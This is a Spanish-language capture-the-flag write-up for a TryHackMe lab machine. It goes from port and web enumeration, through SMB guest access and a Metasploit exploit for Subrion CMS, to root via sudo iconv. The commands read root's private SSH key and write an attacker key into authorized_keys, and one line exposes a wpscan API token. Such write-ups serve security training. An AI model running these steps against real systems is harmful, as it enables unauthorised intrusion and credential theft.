https://tryhackme.com/r/room/techsupp0rt1
# Fase de reconocimiento
## Buscamos puertos abiertos
```
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.165.199
```
![[Pasted image 20240502184416.png]]
## Reconocimiento de servicios
```
nmap -sCV -p22,80,139,445 10.10.165.199
```
![[Pasted image 20240502184506.png]]
## Gobuster
```
gobuster dir -u http://10.10.165.199 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```
![[Pasted image 20240502185143.png]]
## Buscar vulnerabilidades
```
wpscan --url http://10.10.165.199/wordpress/ --enumerate u,vp --plugins-detection aggressive --api-token=JEAjjAl4QgJHsvAsM4snXHmj5U0ezG0BzgX8LnzSg2U
```
![[Pasted image 20240502192143.png]]
## Crackmapexec
```
crackmapexec smb 10.10.165.199
```
![[Pasted image 20240502184557.png]]
Buscamos archivos compartidos
```
crackmapexec smb 10.10.165.199 --shares -u guest -p ""
```
![[Pasted image 20240502192109.png]]
# Fase de ataque
## SMB
```
smbclient -N //10.10.165.199/websvr
```
![[Pasted image 20240502192719.png]]
Contiene la contraseña de subrion
## Descifrar la contraseña
![[Pasted image 20240502193842.png]]
Buscar panel admin en subrion
```
gobuster dir -u http://10.10.165.199/subrion -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --status-codes-blacklist '301,404,302'
```


![[Pasted image 20240502193936.png]]
Podemos iniciar sesion y tambien ver la version de subrion

## Buscar vulnerabilidades
```
searchsploit subrion
```
![[Pasted image 20240502194054.png]]
Encontramos un LFI

## Explotación
Encontramos un exploit en Github https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE

Pero usaremos metaexploit
```
search subrion
```
```
use 0
```
![[Pasted image 20240502195205.png]]
Set options
```
run
```
[-] ==pwned!==


# Privilege Escalation
Dentro de /home podemos encontrar un usuariuo llamado scamsite
Abrimos wp-config.php en busca de credenciales: /var/www/html/wordpress/wp-config.php
![[Pasted image 20240502200236.png]]
## SSH
Probamos las credenciales
![[Pasted image 20240502200413.png]]
Login!

## Comprobamos privilegios
TIene privilegios en iconv, lo buscamos en https://gtfobins.github.io
![[Pasted image 20240502200527.png]]
![[Pasted image 20240502200520.png]]
Se puede usar para leer archivos y escribir
Podriamos leer o escribir la clave privada en ssh
```
sudo -u root iconv -f 8859_1 -t 8859_1 "/root/.ssh/id_rsa"
```

Creamos nuestra clave privada/publica
```
ssh-keygen -t rsa
```
La copiamos dentro de la maquina y la copiamos en el directorio de root
```
cat rsa.pub | sudo -u root iconv -f 8859_1 -t 8859_1 -o "/root/.ssh/authorized_keys"
```
Nos conectamos
```
ssh -i id_rsai root@10.10.165.199
```
[+] ==pwned!==


